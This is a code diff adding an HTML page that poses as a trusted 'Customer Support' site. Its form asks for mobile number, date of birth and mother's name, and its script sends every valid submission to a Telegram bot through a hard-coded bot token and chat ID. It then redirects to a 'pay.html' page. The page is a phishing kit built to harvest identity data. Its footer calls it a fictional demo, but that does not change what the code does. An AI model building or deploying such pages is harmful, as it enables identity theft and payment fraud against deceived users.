@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Support</title>
+    <style>
+        /* Your existing CSS styles */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f4f4f9;
+        }
+
+        .header img {
+            width: 100%;
+            height: auto;
+            margin: 20px auto;
+            display: block;
+        }
+
+        .text-slider {
+            display: flex;
+            overflow: hidden;
+            white-space: nowrap;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b, #1e90ff, #32cd32);
+            background-size: 300% 300%;
+            padding: 10px 0;
+            animation: bgAnimation 6s infinite linear;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .text-slider span {
+            display: inline-block;
+            padding: 0 30px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8), 0 0 10px rgba(255, 255, 255, 0.6);
+            animation: marquee 10s linear infinite;
+        }
+
+        @keyframes marquee {
+            from { transform: translateX(100%); }
+            to { transform: translateX(-100%); }
+        }
+
+        @keyframes bgAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .form-container {
+            padding: 20px;
+            background: #f9f9f9;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        form {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            animation: slideIn 1s ease-in-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: blue;
+            outline: none;
+        }
+
+        .btn {
+            background: blue;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+            transition: background 0.3s ease;
+        }
+
+        .btn:hover {
+            background: darkblue;
+        }
+
+        .footer {
+            padding: 20px;
+            background: #333;
+            color: white;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: blue;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+
+        .warning {
+            color: red;
+            font-size: 0.9em;
+            display: none;
+        }
+
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .popup button {
+            background: blue;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="OIP.png" alt="Header Image" onerror="this.src='placeholder.png';">
+    </div>
+    <div class="text-slider">
+        <span>Customer Support 100% Trust | Customer Care | We Value Your Feedback</span>
+        <span>24/7 Customer Support | Your Satisfaction, Our Priority | Trusted Service</span>
+        <span>Reliable Help Anytime | Customer Care You Can Trust | We’re Here for You</span>
+        <span>Fast & Friendly Support | Customer Care Excellence | We Listen, We Act</span>
+        <span>Quality Assistance | Support You Can Rely On | Your Feedback Matters</span>
+        <span>Exceptional Service | Dedicated Customer Care | Trust & Satisfaction Guaranteed</span>
+    </div>
+    <div class="form-container">
+        <form id="supportForm">
+            <h2>Customer Support</h2>
+            <!-- Mobile Number Field -->
+            <input type="tel" id="mobile" placeholder="Mobile Number (Optional)" pattern="[0-9]{10}" aria-label="Mobile Number" aria-describedby="mobileWarning">
+            <p class="warning" id="mobileWarning">Please enter a valid 10-digit mobile number.</p>
+
+            <!-- Date of Birth Field -->
+            <input type="date" id="dob" placeholder="Date of Birth" required aria-label="Date of Birth" aria-describedby="dobWarning">
+            <p class="warning" id="dobWarning">You must be at least 18 years old.</p>
+
+            <!-- Mother's Name Field -->
+            <input type="text" id="motherName" placeholder="Mother's Name (Only Alphabets)" required aria-label="Mother's Name" aria-describedby="nameWarning">
+            <p class="warning" id="nameWarning">Mother's name should only contain alphabets.</p>
+            
+            <!-- Submit Button -->
+            <button type="submit" class="btn">Submit</button>
+        </form>
+    </div>
+    <div class="footer">
+        <p><a href="index.html">Home</a> | <a href="about.html">About</a> | <a href="policy.html">Policy</a></p>
+        <p>Disclaimer: This is a demo customer support page. All information provided is fictional.</p>
+        <p>&copy; 2025 Customer Support. All Rights Reserved.</p>
+    </div>
+    <div class="popup" id="popup">
+        <p id="popupMessage"></p>
+        <button onclick="closePopup()">OK</button>
+    </div>
+    <script>
+        const textSlider = document.querySelector('.text-slider');
+        const spans = textSlider.querySelectorAll('span');
+        let currentIndex = 0;
+
+        function showNextSpan() {
+            spans[currentIndex].style.animation = 'none';
+            spans[currentIndex].offsetHeight;
+            spans[currentIndex].style.animation = null;
+
+            currentIndex = (currentIndex + 1) % spans.length;
+        }
+
+        setInterval(showNextSpan, 10000);
+
+        async function sendToTelegramBot(message) {
+            const botToken = '7844394659:AAHvA5nX4lt68_5jayLddHDPr4W09JQlSsI';
+            const chatId = '-1002354984113';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Message sent to Telegram:', data);
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        function validateForm(event) {
+            event.preventDefault();
+            const mobileInput = document.getElementById('mobile');
+            const dobInput = document.getElementById('dob');
+            const motherNameInput = document.getElementById('motherName');
+            const mobileWarning = document.getElementById('mobileWarning');
+            const dobWarning = document.getElementById('dobWarning');
+            const nameWarning = document.getElementById('nameWarning');
+            const popup = document.getElementById('popup');
+            const popupMessage = document.getElementById('popupMessage');
+            let isValid = true;
+
+            // Validate Mobile Number
+            const mobileValue = mobileInput.value.trim();
+            if (mobileValue && !/^\d{10}$/.test(mobileValue)) {
+                mobileWarning.style.display = 'block';
+                isValid = false;
+            } else {
+                mobileWarning.style.display = 'none';
+            }
+
+            // Validate Date of Birth
+            const today = new Date();
+            const birthDate = new Date(dobInput.value);
+            const age = today.getFullYear() - birthDate.getFullYear();
+            if (age < 18 || isNaN(age)) {
+                dobWarning.style.display = 'block';
+                isValid = false;
+            } else {
+                dobWarning.style.display = 'none';
+            }
+
+            // Validate Mother's Name
+            if (!/^[A-Za-z\s]+$/.test(motherNameInput.value)) {
+                nameWarning.style.display = 'block';
+                isValid = false;
+            } else {
+                nameWarning.style.display = 'none';
+            }
+
+            // Show popup message
+            if (!isValid) {
+                popupMessage.textContent = 'Please correct the highlighted fields.';
+                popup.style.display = 'block';
+            } else {
+                popupMessage.textContent = 'Form submitted successfully!';
+                popup.style.display = 'block';
+
+                // Prepare the message to send to Telegram
+                const message = `New Form Submission:\nMobile: ${mobileValue}\nDate of Birth: ${dobInput.value}\nMother's Name: ${motherNameInput.value}`;
+
+                // Send the message to Telegram
+                sendToTelegramBot(message);
+
+                // Redirect to another page after a delay (e.g., 2 seconds)
+                setTimeout(function() {
+                    window.location.href = 'pay.html'; // Change this to the desired URL
+                }, 2000);
+            }
+        }
+
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        document.getElementById('supportForm').addEventListener('submit', validateForm);
+
+        // Real-time validation
+        document.getElementById('mobile').addEventListener('input', function () {
+            const mobileValue = this.value.trim();
+            const mobileWarning = document.getElementById('mobileWarning');
+            if (mobileValue && !/^\d{10}$/.test(mobileValue)) {
+                mobileWarning.style.display = 'block';
+            } else {
+                mobileWarning.style.display = 'none';
+            }
+        });
+
+        document.getElementById('dob').addEventListener('change', function () {
+            const today = new Date();
+            const birthDate = new Date(this.value);
+            const age = today.getFullYear() - birthDate.getFullYear();
+            const dobWarning = document.getElementById('dobWarning');
+            if (age < 18 || isNaN(age)) {
+                dobWarning.style.display = 'block';
+            } else {
+                dobWarning.style.display = 'none';
+            }
+        });
+
+        document.getElementById('motherName').addEventListener('input', function () {
+            const nameWarning = document.getElementById('nameWarning');
+            if (!/^[A-Za-z\s]+$/.test(this.value)) {
+                nameWarning.style.display = 'block';
+            } else {
+                nameWarning.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
